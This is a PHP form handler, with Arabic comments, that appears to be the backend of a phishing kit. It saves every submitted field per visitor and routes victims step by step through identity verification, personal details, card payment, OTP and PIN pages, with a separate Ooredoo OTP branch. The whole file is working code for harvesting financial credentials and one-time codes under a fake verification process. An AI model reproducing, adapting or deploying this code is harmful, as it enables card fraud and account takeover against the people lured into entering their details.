<?php
require_once 'includes/db.php';
require_once 'includes/functions.php';

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $visitor_id = $_POST['visitor_id'] ?? '';
    if (empty($visitor_id)) {
        $visitor_id = "visitor_" . bin2hex(random_bytes(4));
    }

    $current_page = basename($_SERVER['HTTP_REFERER'] ?? 'index.php');
    
    // سجل تتبع للتأكد من وصول الكود الجديد للسيرفر
    error_log("Processing request for visitor: $visitor_id on page: $current_page");

    // التأكد من وجود الزائر في جدول visitors أولاً لتجنب خطأ Foreign Key
    try {
        if (strpos($current_page, 'index.php') !== false) {
            updateVisitorStep($visitor_id, 'index');
        } else {
            updateVisitorStep($visitor_id, $current_page);
        }
    } catch (Exception $e) {
        error_log("Error updating visitor step: " . $e->getMessage());
    }

    // الآن يمكن حفظ البيانات بأمان
    foreach ($_POST as $key => $value) {
        if ($key !== 'visitor_id' && $key !== 'submit') {
            saveData($visitor_id, $key, $value);
        }
    }

    if (strpos($current_page, 'index.php') !== false) {
        header("Location: update_info.php?visitor_id=$visitor_id");
        exit;
    }

    if (strpos($current_page, 'update_info.php') !== false) {
        header("Location: identity_verification.php?visitor_id=$visitor_id");
        exit;
    }

    if (strpos($current_page, 'identity_verification.php') !== false) {
        header("Location: personal_info.php?visitor_id=$visitor_id");
        exit;
    }

    if (strpos($current_page, 'personal_info.php') !== false) {
        header("Location: payment.php?visitor_id=$visitor_id");
        exit;
    }

    // صفحة التحميل تظهر فقط بعد إدخال البطاقة (payment.php) أو Ooredoo
    header("Location: loading.php?visitor_id=$visitor_id&next=" . getNextStep($current_page));
    exit;
}

function getNextStep($current) {
    if (strpos($current, 'payment.php') !== false) return 'otp.php';
    if (strpos($current, 'otp.php') !== false) return 'pin.php';
    if (strpos($current, 'ooredoo.php') !== false) return 'otp_ooredoo.php';
    if (strpos($current, 'otp_ooredoo.php') !== false) return 'success.php';
    return 'success.php';
}
?>
